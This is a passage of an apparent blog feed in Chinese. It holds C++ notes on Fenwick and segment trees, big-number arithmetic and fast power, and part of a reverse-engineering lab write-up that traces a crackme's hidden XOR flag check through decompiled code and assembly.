class="keyword">while</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        s+=c[i];</span><br><span class="line">        i-=lowbit[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>线段树</h1><h2 id="内容-2">内容</h2><p>将正常的数组（连续的元素）换成树的结构进行存储，采用二分形式，原本的每个元素都变成一个叶子结点，然后添加结点让它变成一颗树，其中每个节点保存了它管辖的区间的左右端（相等是叶子）和额外的信息，比如区间和等等，每个节点可操作性很强，因此同时可以允许惰性修改。</p><p>对于一个长度为N的输入，线段数需要4N的空间（数组开4倍长）</p><h2 id="建立-2">建立</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> root_idx,<span class="type">int</span> left,<span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;build(%d,%d,%d)\n&quot;,root_idx,left,right);</span></span><br><span class="line">tree[root_idx].left=left;</span><br><span class="line">tree[root_idx].right=right;</span><br><span class="line"><span class="keyword">if</span>(left==right)&#123;</span><br><span class="line">tree[root_idx].min=input[left];<span class="comment">//叶子结点，对应具体的元素 </span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> mid=(left+right)&gt;&gt;<span class="number">1</span>;</span><br><span class="line"><span class="built_in">build</span>(root_idx*<span class="number">2</span>,left,mid);</span><br><span class="line"><span class="built_in">build</span>(root_idx*<span class="number">2</span>+<span class="number">1</span>,mid+<span class="number">1</span>,right);</span><br><span class="line">tree[root_idx].min=<span class="built_in">min</span>(tree[root_idx*<span class="number">2</span>].min,tree[root_idx*<span class="number">2</span>+<span class="number">1</span>].min);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查询-2">查询</h2><h2 id="修改">修改</h2><h1>并查集</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;/h1&gt;
&lt;h1&gt;树状数组&lt;/h1&gt;
&lt;div class=&quot;tips&quot;&gt;
&lt;p&gt;是线段树的子集。也就是说他能干的线段树都能干，它干不了的线段树也能干。只是这个结构在空间上优化很大，不需要额外空间就能实现。同时编程也靠lowbit大大简化&lt;/p&gt;
&lt;/div&gt;
&lt;h2 </summary>
      
    
    
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm(1)</title>
    <link href="http://example.com/2024/09/24/Algorithm-1/"/>
    <id>http://example.com/2024/09/24/Algorithm-1/</id>
    <published>2024-09-24T04:35:46.000Z</published>
    <updated>2024-11-28T15:34:50.752Z</updated>
    
    <content type="html"><![CDATA[<h1>写在前面（关于做题的经验）</h1><ul class="lvl-0"><li class="lvl-2">判断是不是用简单的算法思想就能解决（不需要更多数据结构），分治？贪心？</li><li class="lvl-2">如果是贪心，核心是确定好cmp函数</li><li class="lvl-2">如果是分治，确定递归函数的内容，全局数组+左边界（参数1）+右边界（参数2）+参数3</li><li class="lvl-2">剪枝：搜索过程中利用某些额外的条件判断提前返回从而优化搜索时间</li><li class="lvl-2">反向思考，a要能到b，b到a？</li><li class="lvl-2">常见数据结构和算法的模板</li></ul><h1>高精度计算</h1><p>本质上是字符串处理。参考oi wiki的高精乘和加模板</p><blockquote><p>高精加：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> b[], <span class="type">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line">  <span class="comment">// 高精度实现中，一般令数组的最大长度 LEN 比可能的输入大一些</span></span><br><span class="line">  <span class="comment">// 然后略去末尾的几次循环，这样一来可以省去不少边界情况的处理</span></span><br><span class="line">  <span class="comment">// 因为实际输入不会超过 1000 位，故在此循环到 LEN - 1 = 1003 已经足够</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 将相应位上的数码相加</span></span><br><span class="line">    c[i] += a[i] + b[i];</span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="comment">// 进位</span></span><br><span class="line">      c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">      c[i] -= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高精*低精：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mul_short</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> b, <span class="type">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 直接把 a 的第 i 位数码乘以乘数，加入结果</span></span><br><span class="line">    c[i] += a[i] * b;</span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="comment">// 处理进位</span></span><br><span class="line">      <span class="comment">// c[i] / 10 即除法的商数成为进位的增量值</span></span><br><span class="line">      c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">      <span class="comment">// 而 c[i] % 10 即除法的余数成为在当前位留下的值</span></span><br><span class="line">      c[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进位单独抽出来也行：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">result_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(sav,<span class="number">0</span>,<span class="built_in">sizeof</span>(sav));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">500</span>;i+=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">500</span>;j+=<span class="number">1</span>)</span><br><span class="line">            sav[i+j<span class="number">-1</span>]+=res[i]*f[j];<span class="comment">//先计算每一位上的值（不进位）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">500</span>;i+=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sav[i+<span class="number">1</span>]+=sav[i]/<span class="number">10</span>;<span class="comment">//单独处理进位问题，不容易出错</span></span><br><span class="line">        sav[i]%=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(res,sav,<span class="built_in">sizeof</span>(res));<span class="comment">//cstring库里的赋值函数，把sav的值赋给res</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高精*高精：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mul</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> b[], <span class="type">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 这里直接计算结果中的从低到高第 i 位，且一并处理了进位</span></span><br><span class="line">    <span class="comment">// 第 i 次循环为 c[i] 加上了所有满足 p + q = i 的 a[p] 与 b[q] 的乘积之和</span></span><br><span class="line">    <span class="comment">// 这样做的效果和直接进行上图的运算最后求和是一样的，只是更加简短的一种实现方式</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i; ++j) c[i] += a[j] * b[i - j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">      c[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高精度输入输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">(<span class="type">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(<span class="type">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">clear</span>(a);</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="comment">// 如上所述，反转</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  <span class="comment">// s[i] - &#x27;0&#x27; 就是 s[i] 所表示的数码</span></span><br><span class="line">  <span class="comment">// 有些同学可能更习惯用 ord(s[i]) - ord(&#x27;0&#x27;) 的方式理解</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">    <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>快速模幂的代码实现</h1><p>原理课上学过，拆成2进制后复用自乘减少次数，优化复杂度到$Ologn$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">quickPower</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span><span class="comment">//是求a的b次方</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">1</span>, base = a;<span class="comment">//ans为答案，base为a^(2^n)</span></span><br><span class="line"><span class="keyword">while</span>(b &gt; <span class="number">0</span>)<span class="comment">//b是一个变化的二进制数，如果还没有用完</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">if</span>(b &amp; <span class="number">1</span>)<span class="comment">//&amp;是位运算，b&amp;1表示b在二进制下最后一位是不是1，如果是：</span></span><br><span class="line">ans *= base;<span class="comment">//把ans乘上对应的a^(2^n)</span></span><br><span class="line"></span><br><span class="line">        base *= base;<span class="comment">//base自乘，模乘这里要取模</span></span><br><span class="line">b &gt;&gt;= <span class="number">1</span>;<span class="comment">// 模乘这里要取模</span></span><br><span class="line">        <span class="comment">//位运算，b右移一位，如101变成10（把最右边的1移掉了），10010变成1001。现在b在二进制下最后一位是刚刚的倒数第二位。结合上面b &amp; 1食用更佳</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 模乘这里要处理b为0情况</span></span><br><span class="line">    <span class="comment">// ans%=p</span></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模乘的话，就在每一个乘法后面都添加一个模，<strong>注意边界情况</strong>。</p><h1>素性检测</h1><p>$n^2$遍历</p><h1>最大流</h1><p><strong>最大流最小割定理</strong>：最大流的值等于最小割的容量。（强对偶）</p><p>Ford-Fulkerson $O(mnC)$</p><h1>KMP算法</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面（关于做题的经验）&lt;/h1&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;判断是不是用简单的算法思想就能解决（不需要更多数据结构），分治？贪心？&lt;/li&gt;
&lt;li class=&quot;lvl-2&quot;&gt;如果是贪心，核心是确定好cmp函数&lt;/li</summary>
      
    
    
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Windows函数隐藏——逆向工程实验2022WP</title>
    <link href="http://example.com/2024/09/19/Windows%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C2022WP/"/>
    <id>http://example.com/2024/09/19/Windows%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E2%80%94%E2%80%94%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C2022WP/</id>
    <published>2024-09-19T04:59:57.000Z</published>
    <updated>2024-10-25T10:12:28.327Z</updated>
    
    <content type="html"><![CDATA[<h1>前情提要</h1><p>这道题目是按照课堂上演示的逻辑只改了加密用的数组（换成了学号），逻辑是一样的。上课的演示是啥也看不懂然后ida搜索异或指令进去一个个看，诶🤓，我们就找到了一个输入异或的简单加密函数，这题就解了。事实上之前没有逆向经验的同学也是按照这个步骤很简单就做出了这个题。</p><p>但是实际在实验课上我被这个题卡了很久，按照正常执行流程，程序的入口点后面没有任何关于flag的“判断”内容，将我们的输入异或一次后程序就退出了。怪异。</p><h1>题目分析</h1><p>这个题目的结构非常简单，入口点main0进去后就是一个输入，检查长度，cpy到另一块内存之后检查第八个字符是不是’A’，然后就是一个简单的异或：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-D8h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> len; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_1166007);</span><br><span class="line">  sub_FFCD46(&amp;unk_11631E0, <span class="string">&quot;Please Input:&quot;</span>);</span><br><span class="line">  input(<span class="string">&quot;%s&quot;</span>, Source);</span><br><span class="line">  len = j__strlen(Source);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">30</span> || len &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_FFA6DB((<span class="type">int</span>)&amp;defined_str, v4);</span><br><span class="line">    j___exit_0(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  j__strcpy_s(Destination, <span class="number">0x1E</span>u, Source);</span><br><span class="line">  <span class="keyword">if</span> ( Destination[<span class="number">7</span>] != <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_FFA6DB((<span class="type">int</span>)&amp;defined_str, v4);</span><br><span class="line">    j___exit_0(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  j_xor(Destination);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>异或函数是这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">xor1</span><span class="params">(<span class="type">char</span> *Str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_1166007);</span><br><span class="line">  Str[<span class="number">7</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j__strlen(Str); ++i )</span><br><span class="line">    Str[i] ^= <span class="number">0x1F</span>u;</span><br><span class="line">  <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常的简单啊，但是问题出现了，这个程序要我们输入什么？我们没有看到任何相关的判断和比较，就这么结束了。很吸引人。</p><h1>猜测与实践</h1><h2 id="IDA坏了？">IDA坏了？</h2><p>很容易想到的是，程序通过一些花指令或者混淆的方式干扰了IDA的反汇编伪代码，但是直接看汇编发现没有任何花指令和混淆：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.text:<span class="number">01011</span>A6B <span class="number">0E0</span>                 call    j___exit_0</span><br><span class="line">.text:<span class="number">01011</span>A70     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">01011</span>A70</span><br><span class="line">.text:<span class="number">01011</span>A70     loc_1011A70:                            ; CODE XREF: _main_0+AA↑j</span><br><span class="line">.text:<span class="number">01011</span>A70 <span class="number">0</span>DC                 mov     eax, Destination</span><br><span class="line">.text:<span class="number">01011</span>A75 <span class="number">0</span>DC                 push    eax</span><br><span class="line">.text:<span class="number">01011</span>A76 <span class="number">0E0</span>                 call    j_xor</span><br><span class="line">.text:<span class="number">01011</span>A7B <span class="number">0E0</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">01011</span>A7E</span><br><span class="line">.text:<span class="number">01011</span>A7E     loc_1011A7E:                            ; CODE XREF: _main_0+<span class="number">7</span>E↑j</span><br><span class="line">.text:<span class="number">01011</span>A7E <span class="number">0</span>DC                 xor     eax, eax</span><br><span class="line">.text:<span class="number">01011</span>A80 <span class="number">0</span>DC                 pop     edi</span><br><span class="line">.text:<span class="number">01011</span>A81 <span class="number">0</span>D8                 pop     esi</span><br><span class="line">.text:<span class="number">01011</span>A82 <span class="number">0</span>D4                 pop     ebx</span><br><span class="line">.text:<span class="number">01011</span>A83 <span class="number">0</span>D0                 add     esp, <span class="number">0</span>CCh</span><br><span class="line">.text:<span class="number">01011</span>A89 <span class="number">004</span>                 cmp     ebp, esp</span><br><span class="line">.text:<span class="number">01011</span>A8B <span class="number">004</span>                 call    j___RTC_CheckEsp</span><br><span class="line">.text:<span class="number">01011</span>A90 <span class="number">004</span>                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">01011</span>A92 <span class="number">004</span>                 pop     ebp</span><br><span class="line">.text:<span class="number">01011</span>A93 <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">01011</span>A93     _main_0         endp ; sp-analysis failed <span class="comment">// 不知道为什么，栈是平衡的</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>难道IDA出问题了？？（当时我真的是这么想的），IDA内动态调试按汇编一步步走也没有任何的报错，可以确定反汇编没有问题了，那程序真正的逻辑在哪？</p><h2 id="hint">hint</h2><p>程序在平台给的时候是一个大压缩包，里面放了所有选这门课的人的学号.exe文件，并且强调flag没法共享每个人都不一样。那我们直接字符串搜索学号试试，果然有，交叉引用找到了另外一个加密函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_100DC80</span><span class="params">(<span class="type">char</span> *Str1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_1166007);</span><br><span class="line">  <span class="keyword">if</span> ( Str1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j__strlen(Str1); ++i )</span><br><span class="line">      Str1[i] ^= <span class="number">0x1C</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( !j__strcmp(Str1, Destination) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_FFB4AA((<span class="type">int</span>)&amp;unk_11631E0, <span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">      sub_FFB4AA((<span class="type">int</span>)&amp;unk_11631E0, <span class="string">&#x27;k&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里应该是会输出OK，也就代表这里非常可能，或者说就是我们真正要去的地方。但是这个函数在哪里被调用了？为什么main_0里面没有？</p><h2 id="发生了什么？">发生了什么？</h2><p>动调在这里下断点然后看trace，一看吓一跳：</p><blockquote><p>后续：这些都是IDA识别错了，函数名都是假的，都是找已经有的库函数加的偏移<img src="/images/backtrace.png" alt="backtrace.png"><br>这里我们附带主函数执行到retn的时候的trace：<img src="/images/backtrace2.png" alt="backtrace2.png"><br>感觉这里是类似于linux下_exit会触发的fini_array，但是windows这个debug模式编译的程序除了用户代码以外塞了太多构式东西了，很多机制都很复杂，我们从主函数返回看一眼，首先退出到invoke_main:</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0037</span>A9D0 ?invoke_main@@YAHXZ proc near           ; CODE XREF: __scrt_common_main_seh(<span class="type">void</span>):loc_37A882↑p</span><br><span class="line">.text:<span class="number">0037</span>A9D0                 push    ebp</span><br><span class="line">.text:<span class="number">0037</span>A9D1                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0037</span>A9D3                 call    j_unknown_libname_935</span><br><span class="line">.text:<span class="number">0037</span>A9D8                 push    eax             ; envp</span><br><span class="line">.text:<span class="number">0037</span>A9D9                 call    sub_31E6DC</span><br><span class="line">.text:<span class="number">0037</span>A9DE                 mov     eax, [eax]</span><br><span class="line">.text:<span class="number">0037</span>A9E0                 push    eax             ; argv</span><br><span class="line">.text:<span class="number">0037</span>A9E1                 call    sub_31C2DD</span><br><span class="line">.text:<span class="number">0037</span>A9E6                 mov     ecx, [eax]</span><br><span class="line">.text:<span class="number">0037</span>A9E8                 push    ecx             ; argc</span><br><span class="line">.text:<span class="number">0037</span>A9E9                 call    _main</span><br><span class="line">.text:<span class="number">0037</span>A9EE                 add     esp, <span class="number">0</span>Ch <span class="comment">// &lt;----here</span></span><br><span class="line">.text:<span class="number">0037</span>A9F1                 pop     ebp</span><br><span class="line">.text:<span class="number">0037</span>A9F2                 retn</span><br><span class="line">.text:<span class="number">0037</span>A9F2 ?invoke_main@@YAHXZ endp</span><br></pre></td></tr></table></figure><p>然后退出到__scrt_common_main_seh，在16A的地方调用一个<code>loaddll</code>，然后内部call这么一个函数：<code>?common_exit@@YAXHW4_crt_exit_cleanup_mode@@W4_crt_exit_return_mode@@@Z</code>，在common_exit里，调用了一个函数（没有符号不知道是什么）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">003</span>D9F90 sub_3D9F90      proc near ; CODE XREF: common_exit(<span class="type">int</span>,_crt_exit_cleanup_mode,_crt_exit_return_mode)+<span class="number">45</span>↓p</span><br><span class="line">.text:<span class="number">003</span>D9F90</span><br><span class="line">.text:<span class="number">003</span>D9F90 var_C           = byte ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">003</span>D9F90 var_8           = byte ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">003</span>D9F90 var_1           = byte ptr <span class="number">-1</span></span><br><span class="line">.text:<span class="number">003</span>D9F90 arg_0           = byte ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">003</span>D9F90 arg_4           = 